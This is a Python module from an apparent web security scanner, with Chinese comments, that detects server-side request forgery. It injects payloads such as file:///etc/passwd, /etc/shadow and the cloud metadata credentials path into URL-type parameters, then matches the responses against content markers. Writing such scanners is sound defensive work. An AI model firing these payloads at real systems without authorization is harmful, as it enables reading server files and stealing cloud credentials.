"""PenScope —— SSRF（CWE-918）只读响应检测模块。

分两层，贯彻项目"降低误报、保守判定"的原则：
  1) 潜在 SSRF 注入点发现（Low）：识别 URL/file 类参数名（url/path/file/redirect/avatar…），
     给出"待人工验证"观察项，与既有的上传点/API 被动检测风格一致，不夸大为已利用。
  2) 强证据利用检测（High，仍标记 unverified/L3）：注入 file:///etc/passwd 或云元数据地址
     （169.254.169.254/latest/meta-data），仅当响应出现明确内容特征（本地文件内容 / 元数据 JSON）
     才判定，避免把"参数恰好回显输入"误判为 SSRF。
"""
import re
import requests
from urllib.parse import urlparse, urlunparse, parse_qs
from scanner.web_scan import discover, _send_form, _mk
from cvss_dedup import cwe_for

# URL/file 类参数名（潜在 SSRF sink）
_URL_PARAM_RE = re.compile(
    r"(?i)\b(url|uri|link|src|href|file|path|page|document|doc|nav|next|redirect|redir|"
    r"destination|dest|target|site|host|ip|domain|address|proxy|callback|webhook|image|"
    r"img|avatar|picture|photo|load|fetch|open|resource|u|go|to|return|continue|view|"
    r"download|data|feed|source|api|endpoint)\b"
)

# 强证据载荷：本地文件读取
_FILE_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///C:/Windows/win.ini",
]
# 强证据载荷：云实例元数据（IMDS）
_META_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
]

# 云元数据响应特征
_META_MARKERS = (
    '"instance-id"', '"ami-id"', '"local-ipv4"', '"public-ipv4"',
    '"instance-type"', 'latest/meta-data', 'security-credentials',
)


def _detect_file_content(text):
    if not text:
        return None
    for m in ("root:x:0:0:", "root:*:0:0:", ":/bin/bash", ":/sbin/nologin",
             "[extensions]", "; for 16-bit app support", "C:\\Windows\\"):
        if m in text:
            return m
    return None


def _detect_metadata(text):
    if not text:
        return None
    for m in _META_MARKERS:
        if m in text:
            return m
    return None


def _url_param_points(url):
    points = []
    q = urlparse(url)
    base = urlunparse(q._replace(query="", fragment=""))
    for k in parse_qs(q.query).keys():
        points.append((base, "get", k, [k]))
    return points


def scan_ssrf(url, session, timeout=6.0, verify_ssl=True):
    """SSRF 只读响应检测：注入 file:// 与云元数据地址做强证据判定，并对 URL 类参数给出注入点观察。"""
    findings = []
    forms = discover(url, session, timeout, verify_ssl)
    points = list(_url_param_points(url))
    for f in forms:
        inj = [n for n in f["fields"] if n not in f["file_fields"]]
        for field in inj:
            points.append((f["action"], f["method"], field, f["fields"]))
    if not points:
        return findings

    seen_hit = set()
    seen_sink = set()
    for target, method, p, fields in points:
        if (target, method, p) in seen_hit:
            continue

        # 1) 强证据：file:// 本地文件读取
        file_hit = None
        for payload in _FILE_PAYLOADS:
            try:
                r = _send_form(session, target, method, fields, p, payload, timeout, verify_ssl)
            except requests.RequestException:
                continue
            m = _detect_file_content(r.text)
            if m:
                file_hit = (m, payload, (r.text or "")[:200])
                break
        if file_hit:
            marker, payload, evidence = file_hit
            seen_hit.add((target, method, p))
            findings.append(_mk(
                "SSRF", f"参数 '{p}' 疑似 SSRF 导致本地文件读取（file://）", "High",
                f"向参数 {p}（端点 {target}，方法 {method.upper()}）注入 file:// 载荷后，响应出现本地文件内容"
                f"特征（{marker!r}），可能存在服务端请求伪造并读取本地文件（CWE-918）。需人工确认目标是否限制 file 协议。",
                evidence.replace("\n", " ")[:200],
                "禁止目标服务端发起任意外部/内部请求；对 URL 参数做协议白名单（仅 http/https）与"
                "目标域名白名单；禁用 file:// 等危险协议；对后端响应做严格过滤，避免将其回显给客户端。",
                target,
                cwe=cwe_for("SSRF"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L3",
                poc=f"curl '{target}?{p}={payload}'",
            ))
            continue

        # 2) 强证据：云实例元数据
        meta_hit = None
        for payload in _META_PAYLOADS:
            try:
                r = _send_form(session, target, method, fields, p, payload, timeout, verify_ssl)
            except requests.RequestException:
                continue
            m = _detect_metadata(r.text)
            if m:
                meta_hit = (m, payload, (r.text or "")[:200])
                break
        if meta_hit:
            marker, payload, evidence = meta_hit
            seen_hit.add((target, method, p))
            findings.append(_mk(
                "SSRF", f"参数 '{p}' 疑似 SSRF 命中云实例元数据端点", "High",
                f"向参数 {p}（端点 {target}，方法 {method.upper()}）注入云元数据地址后，响应出现元数据特征"
                f"（{marker!r}），可能泄露云凭证/实例信息（CWE-918）。需人工确认目标是否位于云环境且未隔离元数据服务。",
                evidence.replace("\n", " ")[:200],
                "云环境实例元数据服务（169.254.169.254）应通过网络策略/IMDSv2 隔离，禁止从应用层转发；"
                "对 URL 参数做严格的协议与域名白名单，禁止访问链路本地（169.254.x）与内网地址。",
                target,
                cwe=cwe_for("SSRF"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L3",
                poc=f"curl '{target}?{p}={payload}'",
            ))
            continue

        # 3) 潜在注入点（无强证据，仅观察）
        if _URL_PARAM_RE.search(p) and (target, method, p) not in seen_sink:
            seen_sink.add((target, method, p))
            findings.append(_mk(
                "SSRF", f"参数 '{p}' 为 URL/文件类输入，疑似 SSRF 注入点", "Low",
                f"参数 {p}（端点 {target}，方法 {method.upper()}）名称疑似接受 URL/文件路径，"
                f"可能存在服务端请求伪造风险，但未检测到明确利用证据，需人工构造内网/元数据地址验证。",
                f"param={p} method={method.upper()}",
                "对 URL/文件路径类参数实施协议白名单（仅 http/https）与目的域名/地址白名单；"
                "禁止访问内网、链路本地（169.254.x）与云元数据地址；对后端响应做隔离。",
                target,
                cwe=cwe_for("SSRF"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L1",
                poc=f"curl '{target}?{p}=http://169.254.169.254/latest/meta-data/'",
            ))
    return findings
